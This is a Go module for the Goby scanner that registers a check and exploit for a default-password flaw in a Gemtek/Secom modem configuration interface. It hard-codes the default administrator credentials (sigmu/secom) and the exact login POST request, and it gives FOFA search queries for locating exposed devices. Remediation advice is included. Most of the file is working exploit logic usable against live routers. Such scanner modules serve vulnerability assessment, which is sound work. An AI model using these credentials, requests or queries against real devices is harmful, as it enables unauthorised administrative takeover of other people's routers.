package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Gemtek Modem Configuration Interface Default password vulnerability",
    "Description": "<p>Modem Configuration Interface is an unlimited router management system of China Insurance Corporation. There is a default password in the system. An attacker can control the entire platform through the default password (sigmu/secom) and operate the core functions with administrator privileges.</p>",
    "Product": "Gemtek-Secom-Router",
    "Homepage": "https://www.gemteks.com/",
    "DisclosureDate": "2022-12-26",
    "Author": "13eczou",
    "FofaQuery": "(title=\"Modem configuration interface\" && body=\"status_device_status.asp\" && body!=\"Huawei\") && header!=\"Couchdb\" && header!=\"JoomlaWor\"",
    "GobyQuery": "(title=\"Modem configuration interface\" && body=\"status_device_status.asp\" && body!=\"Huawei\") && header!=\"Couchdb\" && header!=\"JoomlaWor\"",
    "Level": "1",
    "Impact": "<p>attackers can control the entire platform through the default password(sigmu/secom) vulnerability, and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://fofa.info/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/sysconf.cgi?page=login.asp&action=login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "user_name=sigmu&user_passwd=secom&user_lang=en"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "setCookie(\"sid\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "NewLinkHref(\"index.asp\")",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/sysconf.cgi?page=login.asp&action=login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "user_name=sigmu&user_passwd=secom&user_lang=en"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "setCookie(\"sid\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "NewLinkHref(\"index.asp\")",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastheader|text|sigmu:secom"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "中保無限Modem Configuration Interface 默认口令漏洞",
            "Product": "Gemtek-中保無限路由器",
            "Description": "<p>Modem Configuration Interface是一款中保無限路由器管理系统。该系统存在默认口令，攻击者可通过默认口令（sigmu/secom）控制整个平台，使用管理员权限操作核心功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令（sigmu/secom）漏洞控制整个平台，使用管理员权限操作核心的功能。<br><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Gemtek Modem Configuration Interface Default password vulnerability",
            "Product": "Gemtek-Secom-Router",
            "Description": "<p>Modem Configuration Interface is an unlimited router management system of China Insurance Corporation. There is a default password in the system. An attacker can control the entire platform through the default password (sigmu/secom) and operate the core functions with administrator privileges.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>attackers can control the entire platform through the default password(sigmu/secom) vulnerability, and use administrator privileges to operate core functions.</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10784"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}